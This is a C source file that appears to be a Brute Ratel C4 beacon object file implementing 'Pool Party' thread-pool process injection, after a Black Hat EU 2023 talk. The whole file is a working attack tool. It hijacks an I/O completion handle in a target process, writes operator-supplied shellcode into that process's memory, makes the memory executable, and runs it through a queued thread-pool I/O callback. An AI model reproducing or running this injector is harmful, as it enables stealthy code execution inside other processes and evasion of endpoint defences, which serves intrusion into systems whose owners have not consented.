// This technique uses the same technique as
// https://www.blackhat.com/eu-23/briefings/schedule/#the-pool-party-you-will-never-forget-new-process-injection-techniques-using-windows-thread-pools-35446
// but is built to support BRc4 BOFs

#include "pooling.h"

WCHAR* genRand(SIZE_T length) {
    WCHAR* buff = (WCHAR*)BadgerAlloc((length + 1) * sizeof(WCHAR));
    for (int i = 0; i < length; ++i) {
        buff[i] = (L'A' + Msvcrt$rand() % 26);
    }
    return buff;
}

HANDLE HijackProcessHandle(HANDLE hProcess) {
    DWORD dwDesiredAccess = IO_COMPLETION_ALL_ACCESS;
    ULONG procInfoLen = 0;
    NTSTATUS ntError = STATUS_INFO_LENGTH_MISMATCH;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcInfo = NULL;
    HANDLE hDuplicatedObject = NULL;

    do {
        pProcInfo = (PVOID)BadgerAlloc(procInfoLen);
        ntError = Ntdll$NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)(ProcessHandleInformation), pProcInfo, procInfoLen, &procInfoLen);
    } while (ntError == STATUS_INFO_LENGTH_MISMATCH);
    for (int i = 0; i < pProcInfo->NumberOfHandles; i++) {
        if (Kernel32$DuplicateHandle(hProcess, pProcInfo->Handles[i].HandleValue, (HANDLE)-1, &hDuplicatedObject, dwDesiredAccess, FALSE, (DWORD_PTR)NULL)) {
            ULONG objectLen = 0;
            PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = NULL;
            if (Ntdll$NtQueryObject(hDuplicatedObject, ObjectTypeInformation, pObjectTypeInformation, objectLen, &objectLen) == STATUS_INFO_LENGTH_MISMATCH) {
                pObjectTypeInformation = BadgerAlloc(objectLen);
                if (pObjectTypeInformation) {
                    if (Ntdll$NtQueryObject(hDuplicatedObject, ObjectTypeInformation, pObjectTypeInformation, objectLen, &objectLen) == 0) {
                        if (BadgerWcscmp(L"IoCompletion", pObjectTypeInformation->TypeName.Buffer) == 0) {
                            BadgerFree((PVOID*)&pObjectTypeInformation);
                            goto cleanUp;
                        }
                    }
                    BadgerFree((PVOID*)&pObjectTypeInformation);
                }
            }
            Kernel32$CloseHandle(hDuplicatedObject);
            hDuplicatedObject = NULL;
        }
    }
cleanUp:
    BadgerFree((PVOID*)&pProcInfo);
    return hDuplicatedObject;
}

void RemoteTpAlpcInsertionSetupExecution(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE_T shcBufferSize) {
    Msvcrt$srand((unsigned int)Msvcrt$_time64((time_t)NULL));
	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
    DWORD dwOldProtect;
    NTSTATUS ntError = 0;
	char* Buffer = "Hello World";
	SIZE_T BufferLength = sizeof(Buffer);
	OVERLAPPED Overlapped = { 0 };
	WCHAR* ioWriteFile = genRand(7);

	HANDLE hFile = Kernel32$CreateFileW(ioWriteFile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    if (! hFile) {
        goto cleanUp;
    }

	BadgerDispatch(g_dispatch, "[+] Created I/O file: '%ls'\n", ioWriteFile);
	PFULL_TP_IO pTpIo = (PFULL_TP_IO)Kernel32$CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)(shellcode), NULL, NULL);
    if (! pTpIo) {
        BadgerDispatch(g_dispatch, "[-] Error creating thread pool: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }
	pTpIo->CleanupGroupMember.Callback = shellcode;
	++pTpIo->PendingIrpCount;
	PFULL_TP_IO pRemoteTpIo = Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (! pRemoteTpIo) {
        BadgerDispatch(g_dispatch, "[-] Error allocating RW memory: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }
    if (! Kernel32$WriteProcessMemory(hProcess, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), NULL)) {
        BadgerDispatch(g_dispatch, "[-] Error writing process memory: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }

	FileIoCopmletionInformation.Port = hIoCompletion;
	FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;
	ntError = Ntdll$NtSetInformationFile(hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
    if (ntError) {
        BadgerDispatch(g_dispatch, "[-] Error setting file I/O: 0x%X\n", ntError);
        goto cleanUp;
    }
    if (! Kernel32$VirtualProtectEx(hProcess, shellcode, shcBufferSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        BadgerDispatch(g_dispatch, "[-] Error setting RX permission: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }
	if (! Kernel32$WriteFile(hFile, Buffer, BufferLength, NULL, &Overlapped)) {
        if (Kernel32$GetLastError() != ERROR_IO_PENDING) {
            BadgerDispatch(g_dispatch, "[-] Error writing I/O file: %lu\n", Kernel32$GetLastError());
            goto cleanUp;
        }
    }
	BadgerDispatch(g_dispatch, "[+] Write I/O to thread pool success\n", ioWriteFile);
cleanUp:
    BadgerFree((PVOID*)&ioWriteFile);
    if (hFile) {
        Kernel32$CloseHandle(hFile);
    }
}

void coffee(char** argv, int argc, WCHAR** dispatch) {
    g_dispatch = dispatch;
	if (argc < 2) {
	    BadgerDispatch(dispatch, "[!] Usage: tpi.o <pid>\n[!] NOTE: configure shellcode to inject using 'set_coffargs'\n");
		return;
	}
    PVOID shellcode = NULL;
	PVOID shcBuffer = argv[0];
	DWORD dwPid = BadgerAtoi(argv[1]);
	DWORD shcBufferSize = BadgerGetBufferSize(argv[0]);
    HANDLE hIoCompletion = NULL;
    HANDLE hProcess = NULL;

    hProcess = Kernel32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    if (! hProcess) {
        BadgerDispatch(g_dispatch, "[-] Error opening process handle: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }

	hIoCompletion = HijackProcessHandle(hProcess);
    if (! hIoCompletion) {
        BadgerDispatch(g_dispatch, "[-] No thread pools found in process\n");
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Hijacked I/O completion handle\n");

    shellcode = Kernel32$VirtualAllocEx(hProcess, NULL, shcBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (! shellcode) {
        BadgerDispatch(g_dispatch, "[-] Error allocating RW memory: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Shellcode address: 0x%p\n", shellcode);

    if (! Kernel32$WriteProcessMemory(hProcess, shellcode, shcBuffer, shcBufferSize, NULL)) {
        BadgerDispatch(g_dispatch, "[-] Error writing shellcode: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }

	RemoteTpAlpcInsertionSetupExecution(hProcess, hIoCompletion, shellcode, shcBufferSize);

cleanUp:
    if (hProcess) {
        Kernel32$CloseHandle(hProcess);
    }
    if (hIoCompletion) {
        Kernel32$CloseHandle(hIoCompletion);
    }
}